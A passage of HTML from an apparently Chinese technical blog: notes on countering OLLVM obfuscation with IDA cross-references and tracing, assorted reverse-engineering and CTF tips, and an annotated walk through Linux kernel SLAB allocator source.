-<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    result = s.model()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></div></figure>




        <h1 id="十一、OLLVM"   >
          <a href="#十一、OLLVM" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、OLLVM" class="headerlink" title="十一、OLLVM"></a>十一、OLLVM</h1>
      <p>OLLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个项目,该项目旨在提供一套开源的针对LLVM的代码混淆工具,以增加对逆向工程的难度，只不过仅更新到llvm的4.0，2017年开始就没在更新。</p>

        <h2 id="ollvm的分类"   >
          <a href="#ollvm的分类" class="heading-link"><i class="fas fa-link"></i></a><a href="#ollvm的分类" class="headerlink" title="ollvm的分类"></a>ollvm的分类</h2>
      <div class="table-container"><table>
<thead>
<tr>
<th align="left">分类</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">指令替换（Instructions Substitution)(Sub)</td>
<td align="left">将一条运算指令替换为多条等价的运算指令，例如：y=x+1变为y=x+1+1-1</td>
</tr>
<tr>
<td align="left">虚假控制流（Bogus Control Flow)(bcf)</td>
<td align="left">通过加入包含不透明谓词的条件跳转和不可达的基本块，来干扰IDA的控制流分析和F5反汇编</td>
</tr>
<tr>
<td align="left">控制流平坦化(Control Flow Flattening)(Fla)</td>
<td align="left">主要通过一个主分发器来控制程序基本块的执行流程，将所有基本代码放到控制流最底部，然后删除原理基本块之间跳转关系，添加次分发器来控制分发逻辑，然后过新的复杂分发逻辑还原原来程序块之间的逻辑关系</td>
</tr>
<tr>
<td align="left">字符串加密</td>
<td align="left">编写一个pass将其中的字符串信息使用一些加密算法进行加密，然后特定的时间进行还原</td>
</tr>
</tbody></table></div>
<p>具体的例子看参考就行</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1809646-1-1.html" >《安卓逆向这档事》十二、大佬帮我分析一下 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="ollvm对抗"   >
          <a href="#ollvm对抗" class="heading-link"><i class="fas fa-link"></i></a><a href="#ollvm对抗" class="headerlink" title="ollvm对抗"></a>ollvm对抗</h2>
      <p>1.简单ollvm可以通过交叉引用分析<br>2.angr去除不透明谓词<br>3.Unicorn/Unidbg/AndroidNativeEmu模拟执行<br>4.IDA Trace<br>5.binary ninja<br>6.后端编译优化<br>7.frida辅助分析</p>

        <h3 id="IDA交叉分析"   >
          <a href="#IDA交叉分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#IDA交叉分析" class="headerlink" title="IDA交叉分析"></a>IDA交叉分析</h3>
      <p>参照：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1809646-1-1.html" >《安卓逆向这档事》十二、大佬帮我分析一下 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>原始check函数</p>
<p>AES加密，然后和获取的数据比较</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091136749.png" alt="image-20240118091136749"></p>
<p>OLLVM混淆后的check函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091232228.png" alt="image-20240118091232228"></p>
<p>那么从返回值开始分析，交叉引用返回值，定位到v33</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091306726.png" alt="image-20240118091306726"></p>
<p>随后交叉引用v33</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091345033.png" alt="image-20240118091345033">\</p>
<p>276行在272行下面，v33对应v19，那么v33指向内容被修改，v19指向内容也被修改，即v19指向内容的值为v18</p>
<p>交叉引用v18，和strcmp(v32，v31)有关</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091453138.png" alt="image-20240118091453138"></p>
<p>再交叉引用v32，可以看到v32为v17，v17为AES加密后的数据，对应未被OLLVM混淆的v6</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091532527.png" alt="image-20240118091532527"></p>
<p>再看看v31，对应v8</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091638492.png" alt="image-20240118091638492"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118091722931.png" alt="image-20240118091722931"></p>
<p>v8为获取的数据，对应未被OLLVM混淆的v5，最后即可分析完毕。</p>

        <h3 id="IDA的Trace动态分析"   >
          <a href="#IDA的Trace动态分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#IDA的Trace动态分析" class="headerlink" title="IDA的Trace动态分析"></a>IDA的Trace动态分析</h3>
      <ul>
<li>Instruction tracing 调试器将为每条指令保存所有修改后的寄存器值。</li>
<li>Basic block tracing 调试器将保存到达临时基本块断点的所有地址。</li>
<li>Function tracing 调试器将保存发生函数调用或函数返回的所有地址。</li>
</ul>
<p>在解密的地方下断点，这里即为如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118092458285.png" alt="image-20240118092458285"></p>
<p>运行断下来之后，选择Debugger-&gt;Tracing-&gt;Tracing options，取消复选框Trace over debugger segments，然后选择Trace文件保存位置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118093045657.png" alt="image-20240118093045657"></p>
<p>然后Debugger-&gt;Tracing-&gt;Instruction tracing，三个跟踪选项作用在上面说过了</p>
<p>然后确定一个区域，即下两个断点</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118093342263.png" alt="image-20240118093342263"></p>
<p>随后run就行，最终会在下一个断点停下来，然后路过的地方都会变为黄色</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118093516307.png" alt="image-20240118093516307"></p>
<p>结束之后，就能在之前保存日志的地方看见具体信息</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118093557275.png" alt="image-20240118093557275"></p>
<p>有时候Trace的时候没有变黄，那么说明没有运行到，就不需要再进行关注了</p>
<p>之后打开trace的日志分析，重点关注解密AES_ECB_PKCS7_Decrypt的返回结果，这里即X0为函数AES_ECB_PKCS7_Decrypt调用之后的返回结果，这个地址里面有个B4不知道是个啥</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118094535305.png" alt="image-20240118094535305"></p>
<p>在IDA中跳转查看内存，得到最终的返回结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240118094324172.png" alt="image-20240118094324172"></p>

        <h1 id="TIPS"   >
          <a href="#TIPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1>
      
        <h2 id="1-windows的API手册"   >
          <a href="#1-windows的API手册" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-windows的API手册" class="headerlink" title="1.windows的API手册"></a>1.windows的API手册</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/apiindex/windows-api-list" >Windows API 索引 - Win32 apps | Microsoft Docs</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-IDA-python"   >
          <a href="#2-IDA-python" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-IDA-python" class="headerlink" title="2.IDA-python"></a>2.IDA-python</h2>
      
        <h2 id="3-GDB转储调试"   >
          <a href="#3-GDB转储调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-GDB转储调试" class="headerlink" title="3.GDB转储调试"></a>3.GDB转储调试</h2>
      <ul>
<li>生成：<code>generate-core-file</code>生成<code>core</code>文件</li>
<li>调试：<code>gdb programer core_file</code></li>
</ul>

        <h2 id="4-Unity游戏逆向"   >
          <a href="#4-Unity游戏逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Unity游戏逆向" class="headerlink" title="4.Unity游戏逆向"></a>4.Unity游戏逆向</h2>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-495115-1-1.html" >https://www.52pojie.cn/thread-495115-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="5-最长反编译修改"   >
          <a href="#5-最长反编译修改" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-最长反编译修改" class="headerlink" title="5.最长反编译修改"></a>5.最长反编译修改</h2>
      <p>有时候当一个函数太长，就会导致IDA反编译失败，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230726151414182.png" alt="image-20230726151414182"></p>
<p>这个可以通过设置IDA目录下的hexrays.cfg配置文件来设置最大反编译的代码长度，如下，将MAX_FUNCSIZE修改为1024即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230726151344840.png" alt="image-20230726151344840"></p>

        <h2 id="6-安卓Unity"   >
          <a href="#6-安卓Unity" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-安卓Unity" class="headerlink" title="6.安卓Unity"></a>6.安卓Unity</h2>
      <p>核心逻辑一般在bin\Data\Managed\Assembly-CSharp.dll，题目为[MRCTF2020]PixelShooter</p>

        <h2 id="7-C-Net反编译"   >
          <a href="#7-C-Net反编译" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-C-Net反编译" class="headerlink" title="7.C#/.Net反编译"></a>7.C#/.Net反编译</h2>
      <p>可以用dnspy，在github上有<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/dnSpy/dnSpy/releases" >Releases · dnSpy/dnSpy (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>题目见：FlareOn1-Bob_Doge，可以调试的</p>
<ul>
<li>右键-转到入口点</li>
<li>开始分析</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801144313490.png" alt="image-20230801144313490"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230801144322604.png" alt="image-20230801144322604"></p>

        <h2 id="8-字符串显示变量"   >
          <a href="#8-字符串显示变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-字符串显示变量" class="headerlink" title="8.字符串显示变量"></a>8.字符串显示变量</h2>
      <p>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117171031822.png" alt="image-20240117171031822"></p>
<p>实际上应该是字符串</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117171048963.png" alt="image-20240117171048963"></p>
<p>可以通过如下修改一下</p>
<p>Edit-&gt;Plugins-&gt;Hex-rays -&gt;options-&gt;Analysis options 1，去掉如下选项即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240117171243176.png" alt="image-20240117171243176"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/04/01/kernel%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%AC%94%E8%AE%B0/">Linux内核内存分配笔记</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h1>
      <p><code>Linux</code>内核的内存分配很复杂，单独开篇来慢慢记录。</p>

        <h1 id="SLAB"   >
          <a href="#SLAB" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLAB" class="headerlink" title="SLAB"></a>SLAB</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/tolimit/p/4566189.html?utm_source=tuicool&utm_medium=referral" >linux内存源码分析 - SLAB分配器概述 - tolimit - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>函数链：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_alloc()-&gt;slab_alloc()-&gt;__do_cache_alloc()-&gt;__cache_alloc()</span><br></pre></td></tr></table></div></figure>

<p>最终在<code>__cache_alloc</code>进行实际的内存分配，在这进行分配分叉点。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.8 /mm/slab.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *____cache_alloc(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *objp;</span><br><span class="line">    <span class="comment">//当前slab描述符的对象缓冲池</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>;</span></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    <span class="comment">//获取缓冲池,实际上为对应的</span></span><br><span class="line">    <span class="comment">//CPU_addr+kmalloc_caches[xx][xx].cpu_cache</span></span><br><span class="line">    <span class="comment">//这个kmalloc_caches[xx][xx]即为对应大小的slab描述符</span></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">    <span class="comment">//如果存在可用的,就直接进行分配-------freelist式分配</span></span><br><span class="line">	<span class="keyword">if</span> (likely(ac-&gt;avail)) &#123;</span><br><span class="line">		ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//这里即把avail也当作一个idx进行索引了</span></span><br><span class="line">		objp = ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line">		STATS_INC_ALLOCHIT(cachep);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	STATS_INC_ALLOCMISS(cachep);</span><br><span class="line">    <span class="comment">//不存在的话,则进入另一种分配--------其他缓冲池分配</span></span><br><span class="line">	objp = cache_alloc_refill(cachep, flags);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * the &#x27;ac&#x27; may be updated by cache_alloc_refill(),</span></span><br><span class="line"><span class="comment">	 * and kmemleak_erase() requires its correct value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * To avoid a false negative, if an object that is in one of the</span></span><br><span class="line"><span class="comment">	 * per-CPU caches is leaked, we need to make sure kmemleak doesn&#x27;t</span></span><br><span class="line"><span class="comment">	 * treat the array pointers as a reference to the object.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (objp)</span><br><span class="line">		kmemleak_erase(&amp;ac-&gt;entry[ac-&gt;avail]);</span><br><span class="line">	<span class="keyword">return</span> objp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-本地缓冲池分配"   >
          <a href="#1-本地缓冲池分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-本地缓冲池分配" class="headerlink" title="1.本地缓冲池分配"></a>1.本地缓冲池分配</h2>
      <p>这个就不多说了，依据<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code>当作一个<code>array_cache</code>进行分配，分配一个即将对应的<code>array_cache.avail</code>减1。</p>

        <h2 id="2-其他缓冲池分配"   >
          <a href="#2-其他缓冲池分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-其他缓冲池分配" class="headerlink" title="2.其他缓冲池分配"></a>2.其他缓冲池分配</h2>
      <p>进入<code>cache_alloc_refill()</code>函数，还是会有相关的分叉</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slab.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">cache_alloc_refill</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> batchcount;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">ac</span>, *<span class="title">shared</span>;</span></span><br><span class="line">	<span class="keyword">int</span> node;</span><br><span class="line">	<span class="keyword">void</span> *<span class="built_in">list</span> = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">	check_irq_off();</span><br><span class="line">    <span class="comment">//获取node节点id和array_cache相关信息</span></span><br><span class="line">	node = numa_mem_id();</span><br><span class="line">	ac = cpu_cache_get(cachep);</span><br><span class="line">	batchcount = ac-&gt;batchcount;</span><br><span class="line">  	<span class="comment">//不知道干啥的</span></span><br><span class="line">	<span class="keyword">if</span> (!ac-&gt;touched &amp;&amp; batchcount &gt; BATCHREFILL_LIMIT) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If there was little recent activity on this cache, then</span></span><br><span class="line"><span class="comment">		 * perform only a partial refill.  Otherwise we could generate</span></span><br><span class="line"><span class="comment">		 * refill bouncing.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		batchcount = BATCHREFILL_LIMIT;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//真实的node节点指针</span></span><br><span class="line">	n = get_node(cachep, node);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	BUG_ON(ac-&gt;avail &gt; <span class="number">0</span> || !n);</span><br><span class="line">    <span class="comment">//尝试从共享对象缓冲池shared_entry进行分配</span></span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line">	<span class="keyword">if</span> (!n-&gt;free_objects &amp;&amp; (!shared || !shared-&gt;avail))</span><br><span class="line">		<span class="keyword">goto</span> direct_grow;</span><br><span class="line">	<span class="comment">//相关自旋锁</span></span><br><span class="line">	spin_lock(&amp;n-&gt;list_lock);</span><br><span class="line">	shared = READ_ONCE(n-&gt;shared);</span><br><span class="line">	<span class="comment">/* See if we can refill from the shared array */</span></span><br><span class="line">    <span class="comment">//transfer_objects()函数会从共享对象缓冲池shared_entry</span></span><br><span class="line">    <span class="comment">//转移batchcount个空闲对象到本地缓冲池进行分配</span></span><br><span class="line">	<span class="keyword">if</span> (shared &amp;&amp; transfer_objects(ac, shared, batchcount)) &#123;</span><br><span class="line">        <span class="comment">//为什么设置touched?</span></span><br><span class="line">		shared-&gt;touched = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">goto</span> alloc_done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//共享对象缓冲池shared_entry没有空闲对象时,查看</span></span><br><span class="line">	<span class="comment">//slabs_partial(部分空闲)链表和slabs_free(全部空闲)链表</span></span><br><span class="line">	<span class="keyword">while</span> (batchcount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Get slab alloc is to come from. */</span></span><br><span class="line">        <span class="comment">//进入实际分配函数</span></span><br><span class="line">		page = get_first_slab(n, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//如果slabs_partial(部分空闲)链表和slabs_free(全部空闲)链表</span></span><br><span class="line">        <span class="comment">//都没有则重新分配一个slab及对应空间</span></span><br><span class="line">		<span class="keyword">if</span> (!page)</span><br><span class="line">			<span class="keyword">goto</span> must_grow;</span><br><span class="line"></span><br><span class="line">		check_spinlock_acquired(cachep);</span><br><span class="line"></span><br><span class="line">		batchcount = alloc_block(cachep, ac, page, batchcount);</span><br><span class="line">		fixup_slab_list(cachep, n, page, &amp;<span class="built_in">list</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重新分配一个slab</span></span><br><span class="line">must_grow:</span><br><span class="line">	n-&gt;free_objects -= ac-&gt;avail;</span><br><span class="line">alloc_done:</span><br><span class="line">	spin_unlock(&amp;n-&gt;list_lock);</span><br><span class="line">	fixup_objfreelist_debug(cachep, &amp;<span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">direct_grow:</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!ac-&gt;avail)) &#123;</span><br><span class="line">		<span class="comment">/* Check if we can use obj in pfmemalloc slab */</span></span><br><span class="line">		<span class="keyword">if</span> (sk_memalloc_socks()) &#123;</span><br><span class="line">			<span class="keyword">void</span> *obj = cache_alloc_pfmemalloc(cachep, n, flags);</span><br><span class="line">			<span class="keyword">if</span> (obj)</span><br><span class="line">				<span class="keyword">return</span> obj;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		page = cache_grow_begin(cachep, gfp_exact_node(flags), node);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * cache_grow_begin() can reenable interrupts,</span></span><br><span class="line"><span class="comment">		 * then ac could change.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ac = cpu_cache_get(cachep);</span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail &amp;&amp; page)</span><br><span class="line">			alloc_block(cachep, ac, page, batchcount);</span><br><span class="line">		cache_grow_end(cachep, page);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ac-&gt;avail)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ac-&gt;touched = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ac-&gt;entry[--ac-&gt;avail];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="①shared缓存池分配"   >
          <a href="#①shared缓存池分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#①shared缓存池分配" class="headerlink" title="①shared缓存池分配"></a>①shared缓存池分配</h3>
      <p>尝试将<code>kmalloc_caches[xx][xx].node.shared.entry</code>当作一个<code>array_cache</code>进行检测，尝试分配</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220517162554930.png" alt="image-20220517162554930"></p>

        <h3 id="②slabs-partial和slabs-free分配"   >
          <a href="#②slabs-partial和slabs-free分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#②slabs-partial和slabs-free分配" class="headerlink" title="②slabs_partial和slabs_free分配"></a>②slabs_partial和slabs_free分配</h3>
      <p>在<code>get_first_slab()</code>函数中进行分配，尝试获取一个<code>slab</code>页框描述符，依据相关索引，从其中的<code>page-&gt;mapping</code>开始获取堆块对象<code>obj</code>，挨个转移到对应<code>CPU</code>的<code>kmalloc-xx</code>的<code>array_cache</code>（即对应的本地缓冲池中）。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slab.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">get_first_slab</span><span class="params">(struct kmem_cache_node *n, <span class="keyword">bool</span> pfmemalloc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    </span><br><span class="line">	assert_spin_locked(&amp;n-&gt;list_lock);</span><br><span class="line">	page = list_first_entry_or_null(&amp;n-&gt;slabs_partial, struct page,slab_list);</span><br><span class="line">	<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">		n-&gt;free_touched = <span class="number">1</span>;</span><br><span class="line">		page = list_first_entry_or_null(&amp;n-&gt;slabs_free, struct page,</span><br><span class="line">						slab_list);</span><br><span class="line">		<span class="keyword">if</span> (page)</span><br><span class="line">			n-&gt;free_slabs--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks())</span><br><span class="line">		page = get_valid_first_slab(n, page, pfmemalloc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="3-重新分配一个slab"   >
          <a href="#3-重新分配一个slab" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-重新分配一个slab" class="headerlink" title="3.重新分配一个slab"></a>3.重新分配一个slab</h2>
      <p>上面也提到，进入到<code>must_grow</code>即进行<code>slab</code>的重新分配，这个着实有点复杂，不是很会，涉及ZONE、NODE什么之类的数据结构，还有NUMA机制之类的。</p>

        <h1 id="SLUB"   >
          <a href="#SLUB" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB" class="headerlink" title="SLUB"></a>SLUB</h1>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/166649492" >Linux内存管理：slub分配器 - 知乎 (zhihu.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>函数链：</p>
